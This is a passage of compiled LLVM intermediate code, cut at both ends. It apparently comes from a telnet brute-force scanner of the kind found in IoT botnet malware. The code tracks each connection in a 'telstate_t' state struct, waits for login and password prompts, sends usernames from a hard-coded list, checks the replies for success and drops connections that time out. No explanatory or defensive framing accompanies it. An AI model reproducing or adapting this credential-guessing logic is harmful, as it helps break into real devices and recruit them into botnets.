  br i1 %439, label %440, label %472

; <label>:440:                                    ; preds = %421
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  store i32 0, i32* %444, align 4
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 7
  store i16 0, i16* %448, align 16
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 8
  %453 = load i8*, i8** %452, align 8
  %454 = call i8* @strstr(i8* %453, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %455 = icmp ne i8* %454, null
  br i1 %455, label %456, label %461

; <label>:456:                                    ; preds = %440
  %457 = load i32, i32* %2, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 2
  store i8 5, i8* %460, align 8
  br label %466

; <label>:461:                                    ; preds = %440
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 2
  store i8 3, i8* %465, align 8
  br label %466

; <label>:466:                                    ; preds = %461, %456
  %467 = load i32, i32* %2, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 8
  %471 = load i8*, i8** %470, align 8
  call void @llvm.memset.p0i8.i64(i8* %471, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:472:                                    ; preds = %421
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 16
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 8
  %482 = load i8*, i8** %481, align 8
  %483 = load i32, i32* %2, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 7
  %487 = load i16, i16* %486, align 16
  %488 = zext i16 %487 to i32
  %489 = call i32 @readUntil(i32 %477, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %482, i32 1024, i32 %488)
  %490 = icmp ne i32 %489, 0
  br i1 %490, label %491, label %527

; <label>:491:                                    ; preds = %472
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 6
  store i32 0, i32* %495, align 4
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 7
  store i16 0, i16* %499, align 16
  %500 = load i32, i32* %2, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 8
  %504 = load i8*, i8** %503, align 8
  %505 = call i8* @strstr(i8* %504, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %506 = icmp ne i8* %505, null
  br i1 %506, label %507, label %512

; <label>:507:                                    ; preds = %491
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 2
  store i8 5, i8* %511, align 8
  br label %517

; <label>:512:                                    ; preds = %491
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 2
  store i8 3, i8* %516, align 8
  br label %517

; <label>:517:                                    ; preds = %512, %507
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 8
  %522 = load i8*, i8** %521, align 8
  call void @llvm.memset.p0i8.i64(i8* %522, i8 0, i64 1024, i32 1, i1 false)
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 2
  store i8 3, i8* %526, align 8
  br label %2093

; <label>:527:                                    ; preds = %472
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 0
  %532 = load i32, i32* %531, align 16
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 8
  %537 = load i8*, i8** %536, align 8
  %538 = load i32, i32* %2, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 7
  %542 = load i16, i16* %541, align 16
  %543 = zext i16 %542 to i32
  %544 = call i32 @readUntil(i32 %532, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %537, i32 1024, i32 %543)
  %545 = icmp ne i32 %544, 0
  br i1 %545, label %546, label %564

; <label>:546:                                    ; preds = %527
  %547 = load i32, i32* %2, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 6
  store i32 0, i32* %550, align 4
  %551 = load i32, i32* %2, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 7
  store i16 0, i16* %554, align 16
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 8
  %559 = load i8*, i8** %558, align 8
  call void @llvm.memset.p0i8.i64(i8* %559, i8 0, i64 1024, i32 1, i1 false)
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 2
  store i8 5, i8* %563, align 8
  br label %2093

; <label>:564:                                    ; preds = %527
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 16
  %570 = load i32, i32* %2, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 8
  %574 = load i8*, i8** %573, align 8
  %575 = load i32, i32* %2, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 7
  %579 = load i16, i16* %578, align 16
  %580 = zext i16 %579 to i32
  %581 = call i32 @readUntil(i32 %569, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %574, i32 1024, i32 %580)
  %582 = icmp ne i32 %581, 0
  br i1 %582, label %583, label %619

; <label>:583:                                    ; preds = %564
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 6
  store i32 0, i32* %587, align 4
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 7
  store i16 0, i16* %591, align 16
  %592 = load i32, i32* %2, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 8
  %596 = load i8*, i8** %595, align 8
  %597 = call i8* @strstr(i8* %596, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %598 = icmp ne i8* %597, null
  br i1 %598, label %599, label %604

; <label>:599:                                    ; preds = %583
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 2
  store i8 5, i8* %603, align 8
  br label %609

; <label>:604:                                    ; preds = %583
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 2
  store i8 3, i8* %608, align 8
  br label %609

; <label>:609:                                    ; preds = %604, %599
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 8
  %614 = load i8*, i8** %613, align 8
  call void @llvm.memset.p0i8.i64(i8* %614, i8 0, i64 1024, i32 1, i1 false)
  %615 = load i32, i32* %2, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 2
  store i8 3, i8* %618, align 8
  br label %2093

; <label>:619:                                    ; preds = %564
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 0
  %624 = load i32, i32* %623, align 16
  %625 = load i32, i32* %2, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 8
  %629 = load i8*, i8** %628, align 8
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 7
  %634 = load i16, i16* %633, align 16
  %635 = zext i16 %634 to i32
  %636 = call i32 @readUntil(i32 %624, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %629, i32 1024, i32 %635)
  %637 = icmp ne i32 %636, 0
  br i1 %637, label %638, label %656

; <label>:638:                                    ; preds = %619
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 6
  store i32 0, i32* %642, align 4
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  store i16 0, i16* %646, align 16
  %647 = load i32, i32* %2, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 8
  %651 = load i8*, i8** %650, align 8
  call void @llvm.memset.p0i8.i64(i8* %651, i8 0, i64 1024, i32 1, i1 false)
  %652 = load i32, i32* %2, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 2
  store i8 5, i8* %655, align 8
  br label %2093

; <label>:656:                                    ; preds = %619
  %657 = load i32, i32* %2, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %658
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %659, i32 0, i32 8
  %661 = load i8*, i8** %660, align 8
  %662 = call i64 @strlen(i8* %661) #10
  %663 = trunc i64 %662 to i16
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 7
  store i16 %663, i16* %667, align 16
  br label %668

; <label>:668:                                    ; preds = %656
  br label %669

; <label>:669:                                    ; preds = %668
  br label %670

; <label>:670:                                    ; preds = %669
  br label %671

; <label>:671:                                    ; preds = %670
  br label %672

; <label>:672:                                    ; preds = %671
  %673 = load i32, i32* %2, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 6
  %677 = load i32, i32* %676, align 4
  %678 = sub i32 %677, 1412272916
  %679 = add i32 %678, 10
  %680 = add i32 %679, 1412272916
  %681 = add i32 %677, 10
  %682 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %683 = icmp ult i32 %680, %682
  br i1 %683, label %684, label %699

; <label>:684:                                    ; preds = %672
  %685 = load i32, i32* %2, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 0
  %689 = load i32, i32* %688, align 16
  %690 = call i32 @sclose(i32 %689)
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 2
  store i8 0, i8* %694, align 8
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 3
  store i8 1, i8* %698, align 1
  br label %699

; <label>:699:                                    ; preds = %684, %672
  br label %2092

; <label>:700:                                    ; preds = %70
  %701 = load i32, i32* %2, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 0
  %705 = load i32, i32* %704, align 16
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 4
  %710 = load i8, i8* %709, align 2
  %711 = zext i8 %710 to i64
  %712 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 4
  %718 = load i8, i8* %717, align 2
  %719 = zext i8 %718 to i64
  %720 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %719
  %721 = load i8*, i8** %720, align 8
  %722 = call i64 @strlen(i8* %721) #10
  %723 = call i64 @send(i32 %705, i8* %713, i64 %722, i32 16384)
  %724 = icmp slt i64 %723, 0
  br i1 %724, label %725, label %740

; <label>:725:                                    ; preds = %700
  %726 = load i32, i32* %2, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 0
  %730 = load i32, i32* %729, align 16
  %731 = call i32 @sclose(i32 %730)
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 2
  store i8 0, i8* %735, align 8
  %736 = load i32, i32* %2, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 3
  store i8 1, i8* %739, align 1
  br label %2093

; <label>:740:                                    ; preds = %700
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 0
  %745 = load i32, i32* %744, align 16
  %746 = call i64 @send(i32 %745, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %747 = icmp slt i64 %746, 0
  br i1 %747, label %748, label %763

; <label>:748:                                    ; preds = %740
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 0
  %753 = load i32, i32* %752, align 16
  %754 = call i32 @sclose(i32 %753)
  %755 = load i32, i32* %2, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 2
  store i8 0, i8* %758, align 8
  %759 = load i32, i32* %2, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 3
  store i8 1, i8* %762, align 1
  br label %2093

; <label>:763:                                    ; preds = %740
  %764 = load i32, i32* %2, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 2
  store i8 4, i8* %767, align 8
  br label %2092

; <label>:768:                                    ; preds = %70
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 6
  %773 = load i32, i32* %772, align 4
  %774 = icmp eq i32 %773, 0
  br i1 %774, label %775, label %781

; <label>:775:                                    ; preds = %768
  %776 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 6
  store i32 %776, i32* %780, align 4
  br label %781

; <label>:781:                                    ; preds = %775, %768
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 0
  %786 = load i32, i32* %785, align 16
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 8
  %791 = load i8*, i8** %790, align 8
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 7
  %796 = load i16, i16* %795, align 16
  %797 = zext i16 %796 to i32
  %798 = call i32 @readUntil(i32 %786, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %791, i32 1024, i32 %797)
  %799 = icmp ne i32 %798, 0
  br i1 %799, label %800, label %832

; <label>:800:                                    ; preds = %781
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 6
  store i32 0, i32* %804, align 4
  %805 = load i32, i32* %2, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 7
  store i16 0, i16* %808, align 16
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 8
  %813 = load i8*, i8** %812, align 8
  %814 = call i8* @strstr(i8* %813, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %815 = icmp ne i8* %814, null
  br i1 %815, label %816, label %821

; <label>:816:                                    ; preds = %800
  %817 = load i32, i32* %2, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 2
  store i8 5, i8* %820, align 8
  br label %826

; <label>:821:                                    ; preds = %800
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 2
  store i8 7, i8* %825, align 8
  br label %826

; <label>:826:                                    ; preds = %821, %816
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 8
  %831 = load i8*, i8** %830, align 8
  call void @llvm.memset.p0i8.i64(i8* %831, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:832:                                    ; preds = %781
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 0
  %837 = load i32, i32* %836, align 16
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 8
  %842 = load i8*, i8** %841, align 8
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 7
  %847 = load i16, i16* %846, align 16
  %848 = zext i16 %847 to i32
  %849 = call i32 @readUntil(i32 %837, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %842, i32 1024, i32 %848)
  %850 = icmp ne i32 %849, 0
  br i1 %850, label %851, label %883

; <label>:851:                                    ; preds = %832
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 6
  store i32 0, i32* %855, align 4
  %856 = load i32, i32* %2, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 7
  store i16 0, i16* %859, align 16
  %860 = load i32, i32* %2, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 8
  %864 = load i8*, i8** %863, align 8
  %865 = call i8* @strstr(i8* %864, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %866 = icmp ne i8* %865, null
  br i1 %866, label %867, label %872

; <label>:867:                                    ; preds = %851
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 2
  store i8 5, i8* %871, align 8
  br label %877

; <label>:872:                                    ; preds = %851
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 2
  store i8 7, i8* %876, align 8
  br label %877

; <label>:877:                                    ; preds = %872, %867
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 8
  %882 = load i8*, i8** %881, align 8
  call void @llvm.memset.p0i8.i64(i8* %882, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:883:                                    ; preds = %832
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 8
  %888 = load i8*, i8** %887, align 8
  %889 = call i8* @strstr(i8* %888, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %890 = icmp ne i8* %889, null
  br i1 %890, label %891, label %906

; <label>:891:                                    ; preds = %883
  %892 = load i32, i32* %2, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %893
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %894, i32 0, i32 0
  %896 = load i32, i32* %895, align 16
